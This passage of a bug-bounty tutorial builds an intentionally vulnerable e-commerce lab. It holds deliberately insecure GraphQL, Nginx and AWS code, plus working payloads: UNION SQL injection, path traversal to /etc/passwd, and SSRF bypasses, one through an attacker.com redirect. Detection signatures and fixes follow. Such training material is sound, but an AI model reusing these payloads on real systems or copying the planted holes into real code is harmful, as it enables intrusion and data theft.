    createOrder(user_id: Int!, items: [OrderItemInput!]!, total: Float!): Order
  }

  input OrderItemInput {
    product_id: Int!
    quantity: Int!
    price: Float!
  }
`;

const resolvers = {
  Query: {
    // ==========================================
    // VULNERABILITY: No authorization -- returns any user's full data
    // including password_hash and ssn_encrypted
    // ==========================================
    user: async (_, { id }) => {
      const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);
      return result.rows[0];
    },

    userByEmail: async (_, { email }) => {
      const result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
      return result.rows[0];
    },

    users: async (_, { role }) => {
      let query = 'SELECT * FROM users';
      if (role) query += ` WHERE role = '${role}'`;  // SQL injection in GraphQL
      const result = await pool.query(query);
      return result.rows;
    },

    products: async (_, { category }) => {
      let query = 'SELECT * FROM products';
      if (category) query += ` WHERE category = '${category}'`;
      const result = await pool.query(query);
      return result.rows;
    },

    product: async (_, { id }) => {
      const result = await pool.query('SELECT * FROM products WHERE id = $1', [id]);
      return result.rows[0];
    },

    orders: async (_, { user_id }) => {
      let query = 'SELECT * FROM orders';
      if (user_id) query += ` WHERE user_id = ${user_id}`;
      const result = await pool.query(query);
      return result.rows;
    },

    order: async (_, { id }) => {
      const result = await pool.query('SELECT * FROM orders WHERE id = $1', [id]);
      return result.rows[0];
    },

    invoices: async (_, { user_id }) => {
      let query = 'SELECT * FROM invoices';
      if (user_id) query += ` WHERE user_id = ${user_id}`;
      const result = await pool.query(query);
      return result.rows;
    },

    invoice: async (_, { id }) => {
      const result = await pool.query('SELECT * FROM invoices WHERE id = $1', [id]);
      return result.rows[0];
    },

    // ==========================================
    // VULNERABILITY: Exposes all internal secrets
    // ==========================================
    internalConfig: async () => {
      const Review = mongoose.model('InternalConfig', new mongoose.Schema({}, { strict: false }), 'internal_config');
      const config = await Review.findOne();
      return config;
    },

    // ==========================================
    // VULNERABILITY: SQL injection via GraphQL argument
    // ==========================================
    searchProducts: async (_, { query }) => {
      const result = await pool.query(
        `SELECT * FROM products WHERE name ILIKE '%${query}%'`
      );
      return result.rows;
    }
  },

  Mutation: {
    // ==========================================
    // VULNERABILITY: No authentication, no authorization
    // Any anonymous request can escalate privileges
    // ==========================================
    updateUser: async (_, { id, role, subscription_tier, credit_balance }) => {
      const updates = [];
      const values = [];
      let paramCount = 0;

      if (role) { paramCount++; updates.push(`role = $${paramCount}`); values.push(role); }
      if (subscription_tier) { paramCount++; updates.push(`subscription_tier = $${paramCount}`); values.push(subscription_tier); }
      if (credit_balance !== undefined) { paramCount++; updates.push(`credit_balance = $${paramCount}`); values.push(credit_balance); }

      paramCount++;
      values.push(id);

      const result = await pool.query(
        `UPDATE users SET ${updates.join(', ')} WHERE id = $${paramCount} RETURNING *`,
        values
      );
      return result.rows[0];
    },

    deleteUser: async (_, { id }) => {
      await pool.query('DELETE FROM users WHERE id = $1', [id]);
      return true;
    },

    createOrder: async (_, { user_id, items, total }) => {
      // VULNERABILITY: Trusts client-supplied total
      const orderNumber = `ORD-GQL-${Date.now()}`;
      const result = await pool.query(
        'INSERT INTO orders (order_number, user_id, total, status, payment_status) VALUES ($1, $2, $3, $4, $5) RETURNING *',
        [orderNumber, user_id, total, 'pending', 'unpaid']
      );
      return result.rows[0];
    }
  },

  // Nested resolvers for relationship traversal
  User: {
    orders: async (parent) => {
      const result = await pool.query('SELECT * FROM orders WHERE user_id = $1', [parent.id]);
      return result.rows;
    },
    invoices: async (parent) => {
      const result = await pool.query('SELECT * FROM invoices WHERE user_id = $1', [parent.id]);
      return result.rows;
    },
    api_keys: async (parent) => {
      const result = await pool.query('SELECT * FROM api_keys WHERE user_id = $1', [parent.id]);
      return result.rows;
    }
  },

  Order: {
    user: async (parent) => {
      const result = await pool.query('SELECT * FROM users WHERE id = $1', [parent.user_id]);
      return result.rows[0];
    },
    items: async (parent) => {
      const result = await pool.query('SELECT * FROM order_items WHERE order_id = $1', [parent.id]);
      return result.rows;
    }
  },

  Product: {
    reviews: async (parent) => {
      const reviews = await mongoose.model('Review', new mongoose.Schema({}, { strict: false }), 'reviews')
        .find({ product_id: parent.id });
      return reviews;
    }
  }
};

async function startServer() {
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    // VULNERABILITY: Introspection enabled
    introspection: true,
    // VULNERABILITY: No query depth limit
    // VULNERABILITY: No query complexity limit
  });

  const { url } = await startStandaloneServer(server, {
    listen: { port: 4001 },
  });

  console.log(`VulnCommerce GraphQL API running at ${url}`);
}

startServer();
```

**GraphQL Exploitation:**

```graphql
# 1. Introspection -- dump entire schema
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
  }
}

# 2. Extract all user data including password hashes and SSNs (no auth required)
{
  users {
    id
    email
    name
    role
    password_hash
    ssn_encrypted
    phone
    address
    credit_balance
  }
}

# 3. Access internal config with secrets
{
  internalConfig {
    stripe_secret_key
    aws_access_key
    aws_secret_key
    database_master_password
    jwt_secret
    admin_api_key
  }
}

# 4. SQL injection via GraphQL argument
{
  searchProducts(query: "' UNION SELECT id,email,password_hash,name,role,null,null,null FROM users--") {
    name
    description
    price
  }
}

# 5. Privilege escalation via mutation (no auth)
mutation {
  updateUser(id: 4, role: "admin", credit_balance: 99999.99) {
    id
    email
    role
    credit_balance
  }
}

# 6. Delete another user (no auth)
mutation {
  deleteUser(id: 5)
}

# 7. Data exfiltration through nested queries
{
  users {
    email
    orders {
      order_number
      total
      shipping_address
      items {
        product { name price }
        quantity
      }
    }
    invoices {
      invoice_number
      amount
      billing_address
      card_last4
      card_brand
    }
  }
}
```

**Difficulty:** Easy (introspection), Easy (no auth on queries), Medium (SQL injection via GraphQL), Easy (mutations without auth)

---

## 8. AWS LocalStack Setup

```bash
#!/bin/bash
# localstack/init-aws.sh
# Runs when LocalStack starts -- sets up intentionally misconfigured AWS resources

echo "Initializing vulnerable AWS environment..."

# ==========================================
# VULNERABILITY: Public S3 bucket with sensitive data
# ==========================================
awslocal s3 mb s3://vulncommerce-uploads
awslocal s3 mb s3://vulncommerce-backups
awslocal s3 mb s3://vulncommerce-internal

# Make uploads bucket publicly readable
awslocal s3api put-bucket-policy --bucket vulncommerce-uploads --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "PublicRead",
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::vulncommerce-uploads",
      "arn:aws:s3:::vulncommerce-uploads/*"
    ]
  }]
}'

# Make backups bucket publicly listable (but not readable -- partial misconfiguration)
awslocal s3api put-bucket-policy --bucket vulncommerce-backups --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "PublicList",
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:ListBucket",
    "Resource": "arn:aws:s3:::vulncommerce-backups"
  }]
}'

# Upload sensitive files to buckets
echo "DATABASE_URL=postgresql://admin:SuperSecretDBPass@db.vulncommerce.internal:5432/production" > /tmp/env.bak
echo "STRIPE_SECRET=sk_live_fake_4eC39HqLyjWDarjtT1zdp7dc" >> /tmp/env.bak
echo "AWS_SECRET_ACCESS_KEY=FaKeS3cR3tKeY+abcdefghijklmnop" >> /tmp/env.bak
awslocal s3 cp /tmp/env.bak s3://vulncommerce-backups/.env.production.bak

echo '{"users_exported": 50000, "includes_pii": true, "export_date": "2024-12-01"}' > /tmp/export_metadata.json
awslocal s3 cp /tmp/export_metadata.json s3://vulncommerce-backups/exports/metadata.json

echo "ADMIN_API_KEY=vulncommerce_admin_sk_98765" > /tmp/admin-config.txt
awslocal s3 cp /tmp/admin-config.txt s3://vulncommerce-internal/config/admin.txt

# ==========================================
# VULNERABILITY: Overly permissive IAM role
# ==========================================
awslocal iam create-role \
  --role-name vulncommerce-app-role \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"Service": "ec2.amazonaws.com"},
      "Action": "sts:AssumeRole"
    }]
  }'

# Attach admin policy (overly permissive)
awslocal iam attach-role-policy \
  --role-name vulncommerce-app-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# ==========================================
# VULNERABILITY: Secrets in Secrets Manager with weak access
# ==========================================
awslocal secretsmanager create-secret \
  --name vulncommerce/database \
  --secret-string '{"host":"db.internal","port":5432,"user":"admin","password":"SuperSecretDBPass!2024","database":"production"}'

awslocal secretsmanager create-secret \
  --name vulncommerce/stripe \
  --secret-string '{"secret_key":"sk_live_fake_4eC39HqLyjWDarjtT1zdp7dc","webhook_secret":"whsec_fake_xxxxx"}'

echo "AWS environment initialized with vulnerabilities."
```

**Exploitation:**

```bash
# Enumerate and access public S3 bucket
aws --endpoint-url=http://localhost:4566 s3 ls s3://vulncommerce-uploads/
aws --endpoint-url=http://localhost:4566 s3 ls s3://vulncommerce-backups/

# Download exposed backup files
aws --endpoint-url=http://localhost:4566 s3 cp s3://vulncommerce-backups/.env.production.bak /tmp/

# List secrets (if SSRF yields credentials)
aws --endpoint-url=http://localhost:4566 secretsmanager list-secrets
aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value \
  --secret-id vulncommerce/database

# Check IAM role permissions
aws --endpoint-url=http://localhost:4566 iam list-attached-role-policies \
  --role-name vulncommerce-app-role
```

**Difficulty:** Easy (public bucket), Medium (SSRF to metadata to IAM escalation)

---

## 9. Intentionally Misconfigured Nginx

```nginx
# nginx/nginx.conf

worker_processes 1;

events {
    worker_connections 1024;
}

http {
    include mime.types;
    default_type application/octet-stream;

    # ==========================================
    # VULNERABILITY: Server version exposed
    # ==========================================
    server_tokens on;

    # ==========================================
    # VULNERABILITY: Missing security headers
    # No X-Frame-Options, no CSP, no X-Content-Type-Options
    # ==========================================

    upstream express_backend {
        server express-api:4000;
    }

    upstream fastapi_backend {
        server fastapi-api:8000;
    }

    upstream graphql_backend {
        server graphql-api:4001;
    }

    upstream frontend {
        server frontend:3000;
    }

    server {
        listen 80;
        server_name localhost;

        # ==========================================
        # VULNERABILITY: Off-by-slash path traversal
        # /static../etc/passwd works due to missing trailing slash
        # ==========================================
        location /static {
            alias /usr/share/nginx/html;
        }

        # ==========================================
        # VULNERABILITY: Exposed nginx status page
        # ==========================================
        location /nginx-status {
            stub_status;
            # No access restriction
        }

        # ==========================================
        # VULNERABILITY: Proxy misconfiguration leaks internal headers
        # ==========================================
        location /api/ {
            proxy_pass http://express_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            # VULNERABILITY: Passes through all client headers including
            # X-Forwarded-For (IP spoofing for rate limit bypass)
        }

        location /py-api/ {
            proxy_pass http://fastapi_backend/api/;
            proxy_set_header Host $host;
        }

        location /graphql {
            proxy_pass http://graphql_backend;
            proxy_set_header Host $host;
        }

        location / {
            proxy_pass http://frontend;
            proxy_set_header Host $host;
        }

        # ==========================================
        # VULNERABILITY: Exposed .git directory
        # ==========================================
        # Missing: location ~ /\.git { deny all; }

        # ==========================================
        # VULNERABILITY: Backup files accessible
        # ==========================================
        # Missing: location ~ \.(bak|sql|env|log)$ { deny all; }

        # ==========================================
        # VULNERABILITY: Path-based access control bypass
        # /admin is blocked, but /Admin, /ADMIN, /admin/ work
        # ==========================================
        location = /admin {
            return 403;
        }
        # Note: This only blocks exact match "/admin"
        # /admin/, /Admin, /admin? all bypass this rule

        # ==========================================
        # VULNERABILITY: CORS headers added by Nginx (conflicting with backend)
        # ==========================================
        add_header Access-Control-Allow-Origin *;
    }
}
```

**Exploitation:**

```bash
# Off-by-slash path traversal
curl http://localhost/static../etc/passwd
curl http://localhost/static../etc/nginx/nginx.conf

# Access nginx status (info disclosure)
curl http://localhost/nginx-status

# Bypass /admin block
curl http://localhost/admin      # 403 (blocked)
curl http://localhost/admin/     # 200 (bypass -- trailing slash)
curl http://localhost/Admin      # 200 (bypass -- case sensitivity)
curl http://localhost/admin?x=1  # 200 (bypass -- query parameter)

# IP spoofing via X-Forwarded-For (rate limit bypass)
curl -H "X-Forwarded-For: 1.2.3.4" http://localhost/api/auth/login
```

**Difficulty:** Easy (status page), Medium (off-by-slash), Easy (admin bypass)

---

## 10. Complete README with Exercises

```markdown
<!-- README.md (for the lab project root) -->
# VulnCommerce -- Intentionally Vulnerable SaaS Lab

A realistic, Docker-based vulnerable e-commerce application for practicing
web application security testing, bug bounty hunting, and penetration testing.

## Quick Start

    docker compose up --build -d

Wait 30 seconds for all services to initialize, then access:

- Frontend: http://localhost:3000
- Express API: http://localhost:4000
- FastAPI API: http://localhost:8000
- GraphQL Playground: http://localhost:4001
- Nginx (reverse proxy): http://localhost:80

## Test Accounts

| Email                        | Password     | Role     |
|------------------------------|-------------|----------|
| admin@vulncommerce.com       | password123 | admin    |
| support@vulncommerce.com     | password123 | support  |
| alice@example.com             | password123 | customer |
| bob@example.com               | password123 | customer |
| charlie@example.com           | password123 | customer |

## Vulnerability Index

### Easy (Beginner)
1. **Debug Endpoint** -- GET /api/debug/config exposes secrets
2. **Mass Assignment (Registration)** -- Set role=admin during signup
3. **Mass Assignment (Profile)** -- Escalate via PUT /api/users/profile
4. **IDOR (Invoices)** -- Read any user's invoice
5. **IDOR (Invoice PDF)** -- No auth on PDF download
6. **Broken RBAC (Dashboard)** -- /api/admin/dashboard has no auth
7. **Broken RBAC (Delete User)** -- Missing admin middleware
8. **File Upload (No Validation)** -- Upload any file type
9. **XSS (dangerouslySetInnerHTML)** -- Stored XSS in reviews
10. **XSS (Reflected)** -- Via search query parameter
11. **GraphQL Introspection** -- Full schema exposed
12. **GraphQL No Auth** -- All queries accessible anonymously
13. **Public S3 Bucket** -- vulncommerce-uploads is world-readable
14. **Nginx Admin Bypass** -- Case/slash bypass on /admin block
15. **Payment Manipulation** -- Client-side price trusted

### Medium (Intermediate)
16. **SQL Injection (Search)** -- Union-based via product search
17. **SQL Injection (GraphQL)** -- Via searchProducts argument
18. **NoSQL Injection (Reviews)** -- Operator injection via query params
19. **NoSQL Injection (Auth Bypass)** -- $gt operator in login
20. **SSRF (URL Fetcher v1)** -- Direct internal access
21. **SSRF (URL Fetcher v2)** -- Bypass allowlist with IP encoding
22. **Race Condition (Coupon)** -- Apply single-use coupon multiple times
23. **XSS (Markdown)** -- Via rehypeRaw in user bio
24. **Nginx Off-by-Slash** -- Path traversal via alias misconfiguration
25. **Payment (Negative Values)** -- Refund manipulation with negative quantities

### Hard (Advanced)
26. **JWT Weak Secret** -- Crack with hashcat, forge admin tokens
27. **JWT Algorithm Confusion** -- alg:none bypass
28. **Blind SQL Injection** -- Time-based via ORDER BY parameter
29. **SSRF to Cloud Metadata** -- Chain SSRF to steal LocalStack IAM credentials
30. **Full Attack Chain** -- SSRF -> IAM creds -> S3 secrets -> DB password -> full compromise

## Exercises

### Exercise 1: Recon and Discovery (30 min)
Without reading the source code, enumerate all API endpoints using:
- Burp Suite crawling
- JavaScript file analysis
- GraphQL introspection
- Directory bruteforcing

### Exercise 2: Authentication Bypass (45 min)
1. Crack the JWT secret
2. Forge an admin token
3. Access admin-only endpoints
4. Try the algorithm confusion attack

### Exercise 3: Data Exfiltration (60 min)
1. Exploit the IDOR to enumerate all invoices
2. Use SQL injection to dump the users table
3. Extract secrets via GraphQL internalConfig query
4. Access S3 backup files

### Exercise 4: Full Kill Chain (90 min)
Chain multiple vulnerabilities to achieve maximum impact:
1. Register with mass assignment to get admin role
2. Use admin access to find the SSRF endpoint
3. Use SSRF to access LocalStack metadata
4. Use IAM credentials to access S3 backups
5. Extract database credentials from backup
6. Access the database directly

### Exercise 5: Write a Bug Report (30 min)
Pick your best finding and write a professional bug bounty report with:
- Clear title and severity assessment
- Step-by-step reproduction
- HTTP requests and responses
- Impact analysis
- Remediation recommendations

## Resetting the Lab

    docker compose down -v
    docker compose up --build -d

## Solutions

Solutions for each vulnerability are in the /solutions directory
(not included by default -- build them yourself first).
```

---

## 11. Detection Strategies for Lab Defenders

The lab also serves as a blue team training environment. Here is what defenders should look for:

```python
# detection/monitor.py
# Simple log analysis for detecting attacks against the lab

import re
import json
from datetime import datetime

ATTACK_SIGNATURES = {
    "sql_injection": [
        r"UNION\s+SELECT",
        r"OR\s+1\s*=\s*1",
        r";\s*DROP\s+TABLE",
        r"pg_sleep\(",
        r"information_schema",
        r"EXTRACTVALUE\(",
    ],
    "nosql_injection": [
        r"\$gt",
        r"\$ne",
        r"\$regex",
        r"\$where",
        r"\$exists",
    ],
    "ssrf": [
        r"169\.254\.169\.254",
        r"127\.0\.0\.1",
        r"localhost",
        r"0x7f",
        r"localstack",
        r"\[::1\]",
    ],
    "path_traversal": [
        r"\.\./",
        r"\.\.\\",
        r"%2e%2e",
        r"/etc/passwd",
        r"/etc/shadow",
    ],
    "xss": [
        r"<script",
        r"onerror\s*=",
        r"onload\s*=",
        r"javascript:",
        r"<svg\s+onload",
    ],
    "jwt_attack": [
        r'"alg"\s*:\s*"none"',
        r'"alg"\s*:\s*"HS256"',  # Suspicious if server uses RS256
    ],
}

def analyze_log_line(line):
    findings = []
    for attack_type, patterns in ATTACK_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, line, re.IGNORECASE):
                findings.append({
                    "type": attack_type,
                    "pattern": pattern,
                    "timestamp": datetime.now().isoformat(),
                    "log_line": line[:500]
                })
    return findings

def monitor_access_log(log_path="/var/log/nginx/access.log"):
    """Tail the access log and alert on attack signatures."""
    import subprocess
    process = subprocess.Popen(
        ["tail", "-f", log_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    for line in iter(process.stdout.readline, b''):
        line_str = line.decode('utf-8', errors='ignore')
        findings = analyze_log_line(line_str)
        for finding in findings:
            print(f"[ALERT] {finding['type']}: {finding['log_line'][:200]}")

if __name__ == "__main__":
    monitor_access_log()
```

---

## 12. Prevention Strategies (The Fix for Each Vulnerability)

For each vulnerability category in the lab, here is the secure implementation:

### Secure JWT Implementation

```javascript
// FIXED: Strong secret, algorithm restriction, short expiry
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Generate a cryptographically random secret (do this once, store securely)
// const secret = crypto.randomBytes(64).toString('hex');
const JWT_SECRET = process.env.JWT_SECRET; // Must be 256+ bit random value

function signToken(payload) {
  return jwt.sign(payload, JWT_SECRET, {
    algorithm: 'HS256',    // Explicit algorithm
    expiresIn: '1h',       // Short expiry
    issuer: 'vulncommerce',
    audience: 'vulncommerce-api'
  });
}

function verifyToken(token) {
  return jwt.verify(token, JWT_SECRET, {
    algorithms: ['HS256'],  // CRITICAL: Restrict to expected algorithm only
    issuer: 'vulncommerce',
    audience: 'vulncommerce-api'
  });
}
```

### Secure IDOR Prevention

```javascript
// FIXED: Ownership check middleware
router.get('/:invoiceNumber', authenticate, async (req, res) => {
  const result = await pool.query(
    'SELECT * FROM invoices WHERE invoice_number = $1 AND user_id = $2',
    [req.params.invoiceNumber, req.user.user_id]  // Filter by user_id
  );

  if (result.rows.length === 0) {
    return res.status(404).json({ error: 'Invoice not found' });
  }

  res.json(result.rows[0]);
});
```

### Secure SQL Queries

```javascript
// FIXED: Parameterized queries
router.get('/search', async (req, res) => {
  const { q, category, sort } = req.query;

  const conditions = ['1=1'];
  const params = [];
  let paramIndex = 0;

  if (q) {
    paramIndex++;
    conditions.push(`(name ILIKE $${paramIndex} OR description ILIKE $${paramIndex})`);
    params.push(`%${q}%`);
  }
  if (category) {
    paramIndex++;
    conditions.push(`category = $${paramIndex}`);
    params.push(category);
  }

  // Allowlist for sort columns
  const allowedSorts = ['name', 'price', 'created_at', 'id'];
  const sortColumn = allowedSorts.includes(sort) ? sort : 'id';

  const query = `SELECT * FROM products WHERE ${conditions.join(' AND ')} ORDER BY ${sortColumn}`;
  const result = await pool.query(query, params);
  res.json(result.rows);
});
```

### Secure File Upload

```javascript
// FIXED: Validate file type, limit size, randomize filename
const crypto = require('crypto');
const path = require('path');

const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

const storage = multer.diskStorage({
  destination: '/app/uploads/',
  filename: (req, file, cb) => {
    // Random filename prevents path traversal and overwrites
    const ext = path.extname(file.originalname).toLowerCase();
    const randomName = crypto.randomBytes(16).toString('hex');
    cb(null, `${randomName}${ext}`);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: MAX_FILE_SIZE },
  fileFilter: (req, file, cb) => {
    if (!ALLOWED_TYPES.includes(file.mimetype)) {
      return cb(new Error('Invalid file type'), false);
    }
    cb(null, true);
  }
});
```

### Secure SSRF Prevention

```python
# FIXED: URL validation with allowlist and private IP blocking
import ipaddress
from urllib.parse import urlparse
import socket

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)

    if parsed.scheme not in ('http', 'https'):
        return False

    # Resolve hostname to IP to prevent DNS rebinding
    try:
        ip = socket.getaddrinfo(parsed.hostname, None)[0][4][0]
        ip_obj = ipaddress.ip_address(ip)
    except (socket.gaierror, ValueError):
        return False

    for network in BLOCKED_NETWORKS:
        if ip_obj in network:
            return False

    return True
```

---

## 13. Bug Bounty Report Example (For Lab Practice)

```
Title: Unauthenticated Access to All User PII via GraphQL
       Introspection and Unprotected Queries

Severity: Critical (CVSS 9.1)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Summary
The GraphQL API at localhost:4001 has introspection enabled and
zero authentication on all queries and mutations. An anonymous
attacker can extract every user's personal data (email, phone,
address, SSN, password hash), modify user roles, delete accounts,
and access internal application secrets including database
credentials and API keys.

## Reproduction Steps

1. Navigate to http://localhost:4001 (GraphQL Playground)
2. Run the introspection query to map the full schema
3. Execute the following query to extract all user data:

    {
      users {
        id email name role phone address
        ssn_encrypted password_hash
        credit_balance subscription_tier
      }
    }

4. Execute the following to extract application secrets:

    {
      internalConfig {
        stripe_secret_key
        aws_access_key
        aws_secret_key
        database_master_password
      }
    }

5. Escalate privileges:

    mutation {
      updateUser(id: 4, role: "admin", credit_balance: 99999) {
        id role credit_balance
      }
    }

## Impact
- Complete data breach: all user PII accessible without authentication
- Password hashes exposed: enables offline cracking for account takeover
- Application secrets exposed: database credentials, AWS keys, Stripe keys
- Arbitrary privilege escalation: any user can be made admin
- Account deletion: any user can be deleted via mutation
- Financial manipulation: credit balances can be modified

## Recommended Fix
1. Disable introspection in production
2. Implement authentication middleware for all resolvers
3. Implement field-level authorization
4. Remove sensitive fields (password_hash, ssn_encrypted) from the schema
5. Add query depth and complexity limits
6. Remove the internalConfig query entirely
```

---

## 14. Severity Assessment for Lab Vulnerabilities

```
Vulnerability                          CVSS    Severity   Bounty Estimate
-------------------------------------- ------- ---------- ---------------
GraphQL full data exposure (no auth)   9.1     Critical   $5,000-$15,000
SQL injection (union-based)            9.8     Critical   $5,000-$20,000
Internal secrets via debug endpoint    9.1     Critical   $3,000-$10,000
S3 bucket with credentials             8.6     High       $3,000-$8,000
SSRF to cloud metadata                 8.5     High       $3,000-$10,000
JWT weak secret (forged admin)         8.1     High       $2,000-$8,000
Admin dashboard no auth                7.5     High       $1,500-$5,000
IDOR on invoices with PII              7.1     High       $1,000-$5,000
Race condition (coupon)                6.5     Medium     $500-$2,000
Mass assignment (role escalation)      8.1     High       $2,000-$5,000
Broken RBAC (delete user)             8.1     High       $2,000-$5,000
NoSQL injection (auth bypass)          9.1     Critical   $3,000-$10,000
File upload (arbitrary file)           7.5     High       $1,000-$4,000
Stored XSS (reviews)                   6.1     Medium     $500-$2,000
Nginx path traversal                   7.5     High       $1,000-$3,000
Payment manipulation                   8.1     High       $2,000-$8,000
```

---

## 15. Common Bypass Techniques (Practice in the Lab)

### Bypassing the SSRF "v2" Endpoint Allowlist

The `/api/fetch/url-v2` endpoint blocks `localhost`, `127.0.0.1`, and `169.254.169.254`. Here are bypass approaches to practice:

```bash
# Decimal IP representation
curl -X POST http://localhost:4000/api/fetch/url-v2 \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://2130706433/api/debug/config"}'

# Hex IP representation
curl -X POST http://localhost:4000/api/fetch/url-v2 \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://0x7f000001/api/debug/config"}'

# IPv6 mapping
curl -X POST http://localhost:4000/api/fetch/url-v2 \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://[::ffff:127.0.0.1]/api/debug/config"}'

# Redirect-based bypass (if you control a domain)
# Set up: redirect.attacker.com -> 302 -> http://169.254.169.254/...
curl -X POST http://localhost:4000/api/fetch/url-v2 \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://redirect.attacker.com/to-metadata"}'
```

### Bypassing the Nginx Admin Block

```bash
# Exact match only blocks "/admin" -- these all bypass:
curl http://localhost/admin/          # Trailing slash
curl http://localhost/admin?x=1       # Query parameter
curl http://localhost/Admin           # Case variation
curl http://localhost/admin%20        # URL-encoded space
curl http://localhost/./admin         # Dot-slash prefix
curl http://localhost/admin;          # Semicolon suffix
```

---

## 16. Lab Setup on Real Infrastructure

### Running on AWS EC2

```bash
# Launch an EC2 instance (t3.medium minimum)
aws ec2 run-instances \
  --image-id ami-0c55b159cbfafe1f0 \
  --instance-type t3.medium \
  --key-name your-key \
  --security-group-ids sg-xxxxx \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=VulnCommerce-Lab}]'

# Security group: Allow inbound 80, 443, 3000, 4000, 4001, 8000 from YOUR IP only
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 80 \
  --cidr YOUR_IP/32

# SSH in and set up
ssh -i your-key.pem ec2-user@<instance-ip>
sudo yum install docker docker-compose -y
sudo systemctl start docker
git clone <your-lab-repo>
cd vulncommerce-lab
docker compose up -d
```

### Running on Linux (local)

```bash
# Install Docker and Docker Compose
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER

# Clone and start
git clone <your-lab-repo>
cd vulncommerce-lab
docker compose up --build -d

# Verify all services are running
docker compose ps

# Expected output:
# NAME              STATUS    PORTS
# nginx             running   0.0.0.0:80->80/tcp
# frontend          running   0.0.0.0:3000->3000/tcp
# express-api       running   0.0.0.0:4000->4000/tcp
# fastapi-api       running   0.0.0.0:8000->8000/tcp
# graphql-api       running   0.0.0.0:4001->4001/tcp
# postgres          running   0.0.0.0:5432->5432/tcp
# mongo             running   0.0.0.0:27017->27017/tcp
# redis             running   0.0.0.0:6379->6379/tcp
# localstack        running   0.0.0.0:4566->4566/tcp
```

---

## 17. Building Custom Nuclei Templates for the Lab

```yaml
# nuclei-templates/vulncommerce-debug-endpoint.yaml
id: vulncommerce-debug-endpoint

info:
  name: VulnCommerce Debug Config Exposure
  author: lab-student
  severity: critical
  description: Tests for exposed debug configuration endpoint

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/debug/config"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "jwt_secret"
          - "database_url"
        condition: and
```

```yaml
# nuclei-templates/vulncommerce-graphql-introspection.yaml
id: vulncommerce-graphql-introspection

info:
  name: VulnCommerce GraphQL Introspection
  author: lab-student
  severity: high
  description: Tests for enabled GraphQL introspection

http:
  - raw:
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"query":"{ __schema { types { name } } }"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "__Schema"
          - "__Type"
        condition: or
```

```bash
# Run templates against the lab
nuclei -u http://localhost:4000 -t ./nuclei-templates/ -severity critical,high
nuclei -u http://localhost:4001 -t ./nuclei-templates/ -severity critical,high
```

---

## Conclusion

This lab is not another toy vulnerable application. It mirrors how real SaaS platforms are built -- multiple services, multiple databases, cloud integration, GraphQL alongside REST, frontend rendering user-generated content, and all the common authentication and authorization patterns that produce the bugs that pay bounties.

Every vulnerability in this lab maps directly to a pattern you will encounter in real bug bounty programs. The JWT weakness is the same pattern that earned a $10,000 bounty on a fintech platform. The IDOR pattern is identical to findings worth $3,000-$5,000 across dozens of programs. The GraphQL exposure mirrors vulnerabilities found in production SaaS applications used by millions.

Start with the Easy vulnerabilities to build confidence and calibrate your tools. Move to Medium to sharpen your manual testing. Tackle the Hard challenges and the full kill chain exercise to develop the chaining mindset that separates top hunters from the crowd.

Build this lab. Break this lab. Then go break the real thing.

---

**Previous in series:** Blog 17 covers the complete bug bounty methodology for testing modern SaaS applications -- the recon pipeline, Burp workflow, and reporting methodology that turns these skills into paid findings.
